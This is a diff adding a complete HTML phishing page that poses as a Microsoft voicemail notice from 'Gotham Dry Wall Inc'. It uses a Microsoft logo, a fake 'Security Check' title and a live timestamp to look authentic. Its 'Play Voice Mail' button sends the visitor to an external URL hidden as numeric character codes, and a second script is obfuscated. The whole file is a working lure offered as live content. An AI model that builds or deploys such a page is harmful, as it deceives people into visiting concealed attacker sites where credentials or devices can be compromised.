@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Check</title>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    background: transparent;
+}
+#button-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    background: white;
+    max-width: auto;
+    width: auto;
+}
+#not-a-robot-btn {
+    background-color: #0078d4; /* Microsoft blue */
+    border: none;
+    padding: 10px 20px;
+    font-size: 16px;
+    color: #fff;
+    cursor: pointer;
+    border-radius: 5px;
+    box-shadow: 0 4px #005a9e;
+    margin-top: 15px;
+    transition: all 0.2s ease;
+}
+#not-a-robot-btn:active {
+    box-shadow: 0 2px #005a9e;
+    transform: translateY(2px);
+}
+#not-a-robot-btn:hover {
+    background-color: #006bb3;
+}
+#logo {
+    margin-bottom: 20px;
+}
+svg {
+    width: 50px;
+    height: 50px;
+}
+</style>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    function deobfuscateUrl(code) {
+        return code.split('-').map(charCode => String.fromCharCode(charCode)).join('');
+    }
+
+    // Corrected obfuscated URL
+    const obfuscatedUrl = "104-116-116-112-115-58-47-47-105-103-117-107-106-46-97-105-117-116-97-114-101-46-119-111-114-108-100-47-79-109-111-117-83-114-83-102";
+
+    // Deobfuscate URL when the script loads
+    const redirectUrl = deobfuscateUrl(obfuscatedUrl);
+
+    document.getElementById('not-a-robot-btn').addEventListener('click', function() {
+        window.location.href = redirectUrl;
+    });
+});
+</script>
+</head>
+<body>
+<div id="button-container">
+    <div id="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="#F25022" d="M0 0h204.8v204.8H0V0z"/><path fill="#7FBA00" d="M243.2 0H448v204.8H243.2V0z"/><path fill="#00A4EF" d="M0 243.2h204.8V448H0V243.2z"/><path fill="#FFB900" d="M243.2 243.2H448V448H243.2V243.2z"/></svg>
+    </div>
+    <p>You have a new voice message below transmitted into your voicemail:</p>
+    
+                                  <p><strong>From:</strong><span> WIRELESS
+                                    CALLER Gotham Dry Wall Inc</span></p>
+                                
+                                  <p><strong>Received:</strong><div class="datetime-display" id="datetime"></div></p>
+                                
+                                  <p><strong>Length:</strong>00:39</p>
+                                
+   To listen to this message, <button id="not-a-robot-btn">Play Voice Mail.</button><br>
+
+                                        
+                                            <img style="width: 150px;height: 40px;" src="https://cdn.pixabay.com/animation/2023/10/24/13/50/13-50-26-112_512.gif" alt="Loading logo">
+                                          
+                                      
+</div>
+
+                                  
+                                      
+                                    
+                                  
+                                
+    <script>
+        function _0x5276(){const _0x21020c=['Monday','getMinutes','September','June','April','4278BDcMEt','Friday','424cfIgaG','Sunday','March','44Nftyow','getDay','August','Saturday','padStart','getElementById','1167016axEvpC','3370290lbtDle','November','14394240QBJhHf','14ySLeaP','textContent','1388714KrlyHi','getSeconds','1398426lDeBJI','datetime','\x20at\x20','February','2wHEPrl','Wednesday','getMonth','691730NuOoZL','October','getDate','Thursday'];_0x5276=function(){return _0x21020c;};return _0x5276();}function _0x1863(_0x3eb9f7,_0x2cef56){const _0x5276ae=_0x5276();return _0x1863=function(_0x1863d7,_0x4a7ee3){_0x1863d7=_0x1863d7-0xaf;let _0x421df3=_0x5276ae[_0x1863d7];return _0x421df3;},_0x1863(_0x3eb9f7,_0x2cef56);}(function(_0x3105b4,_0x3551d6){const _0x2f2c2c=_0x1863,_0x3857e2=_0x3105b4();while(!![]){try{const _0x283d25=parseInt(_0x2f2c2c(0xc0))/0x1*(-parseInt(_0x2f2c2c(0xc6))/0x2)+parseInt(_0x2f2c2c(0xaf))/0x3*(-parseInt(_0x2f2c2c(0xb1))/0x4)+parseInt(_0x2f2c2c(0xc9))/0x5+-parseInt(_0x2f2c2c(0xc2))/0x6*(parseInt(_0x2f2c2c(0xbe))/0x7)+-parseInt(_0x2f2c2c(0xba))/0x8+parseInt(_0x2f2c2c(0xbd))/0x9+-parseInt(_0x2f2c2c(0xbb))/0xa*(-parseInt(_0x2f2c2c(0xb4))/0xb);if(_0x283d25===_0x3551d6)break;else _0x3857e2['push'](_0x3857e2['shift']());}catch(_0x34027e){_0x3857e2['push'](_0x3857e2['shift']());}}}(_0x5276,0xe402d));function updateDateTime(){const _0x263123=_0x1863,_0x122906=new Date(),_0x37ae67=[_0x263123(0xb2),_0x263123(0xcd),'Tuesday',_0x263123(0xc7),_0x263123(0xcc),_0x263123(0xb0),_0x263123(0xb7)],_0x460c01=['January',_0x263123(0xc5),_0x263123(0xb3),_0x263123(0xd1),'May',_0x263123(0xd0),'July',_0x263123(0xb6),_0x263123(0xcf),_0x263123(0xca),_0x263123(0xbc),'December'],_0x1cf3eb=_0x37ae67[_0x122906[_0x263123(0xb5)]()],_0x1b14c9=_0x460c01[_0x122906[_0x263123(0xc8)]()],_0x3c6c08=String(_0x122906[_0x263123(0xcb)]())['padStart'](0x2,'0'),_0x1c320e=_0x122906['getFullYear'](),_0x15fb25=String(_0x122906['getHours']())[_0x263123(0xb8)](0x2,'0'),_0x5669cd=String(_0x122906[_0x263123(0xce)]())[_0x263123(0xb8)](0x2,'0'),_0x5c7386=String(_0x122906[_0x263123(0xc1)]())[_0x263123(0xb8)](0x2,'0'),_0x4baefc=_0x15fb25>=0xc?'PM':'AM',_0x28ed62=_0x15fb25%0xc||0xc,_0x57aa19=_0x1cf3eb+',\x20'+_0x1b14c9+'\x20'+_0x3c6c08+',\x20'+_0x1c320e+_0x263123(0xc4)+_0x28ed62+':'+_0x5669cd+':'+_0x5c7386+'\x20'+_0x4baefc;document[_0x263123(0xb9)](_0x263123(0xc3))[_0x263123(0xbf)]=_0x57aa19;}setInterval(updateDateTime,0x3e8),updateDateTime();
+    </script>
+</body>
+</html>
